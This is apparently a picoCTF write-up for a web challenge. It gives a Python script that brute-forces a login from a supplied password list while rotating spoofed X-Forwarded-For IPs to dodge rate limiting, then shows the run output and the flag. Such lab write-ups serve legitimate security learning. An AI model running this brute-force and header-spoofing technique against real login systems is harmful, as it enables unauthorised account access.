---
title: "Crack the Gate 2"
category: "Web Exploitation"
description: "The login system has been upgraded with a basic rate-limiting mechanism that locks out repeated failed attempts from the same source."
---

## Information given

#### Description

The login system has been upgraded with a basic rate-limiting mechanism that locks out repeated failed attempts from the same source. We've received a tip that the system might still trust user-controlled headers. Your objective is to bypass the rate-limiting restriction and log in using the known email address: ctf-player@picoctf.org and uncover the hidden secret.

Additional details will be available after launching your challenge instance.

#### Hints:
What IP does the server think you're coming from?
Read more about [X-forwarded-For](https://www.typeerror.org/docs/http/headers/x-forwarded-for)
You can rotate fake IPs to bypass rate limits.

## Python solve script

We are also given a `passwords.txt` file:

```
o8GijNLh
FxmTBRic
PE4KtqXe
5Tec2YXd
aDbsDtO9
wSfCgTKV
jaOwWyI1
3HEQWIU0
EI528AbD
Dc7E3bM2
A9q6Ww68
MCpeUa3f
ljqkyqNf
Fbn8zYwV
bfSwplYv
qTmOzEej
jW6RWYbR
xgmwDQ3I
NITi7pqd
KANstcT2
```

Make sure that file is in the same directory as your python file:

```python
#!/usr/bin/env python3

import requests, random, json

  

TARGET = "http://amiable-citadel.picoctf.net:57333/login"

EMAIL = "ctf-player@picoctf.org"

PWFILE = "passwords.txt"

  

def rand_ip():

return "{}.{}.{}.{}".format(random.randint(1,223), random.randint(0,255), random.randint(0,255), random.randint(0,255))

  

with open(PWFILE, 'r') as f:

for line in f:

pw = line.strip()

if not pw:

continue

headers = {

"X-Forwarded-For": rand_ip(),

"User-Agent": "CTF-Checker",

"Content-Type": "application/json"

}

payload = {"email": EMAIL, "password": pw}

r = requests.post(TARGET, headers=headers, json=payload, timeout=10)

try:

j = r.json()

except Exception:

print("non-json response:", r.text)

continue

print("try", pw, "->", j)

if j.get("success"):

print("FOUND!", pw)

print("FLAG:", j.get("flag"))

break
```

## Exploitation

```bash
siddharthsehgal@mac junk % /usr/local/bin/python3 new_exploit.py
try o8GijNLh -> {'success': False}
try FxmTBRic -> {'success': False}
try PE4KtqXe -> {'success': False}
try 5Tec2YXd -> {'success': False}
try aDbsDtO9 -> {'success': False}
try wSfCgTKV -> {'success': False}
try jaOwWyI1 -> {'success': False}
try 3HEQWIU0 -> {'success': False}
try EI528AbD -> {'success': False}
try Dc7E3bM2 -> {'success': True, 'email': 'ctf-player@picoctf.org', 'firstName': 'pico', 'lastName': 'player', 'flag': 'picoCTF{xff_byp4ss_brut3_f6cca7d4}'}
FOUND! Dc7E3bM2
FLAG: picoCTF{xff_byp4ss_brut3_f6cca7d4}
```

So the flag is: `picoCTF{xff_byp4ss_brut3_f6cca7d4}`.

---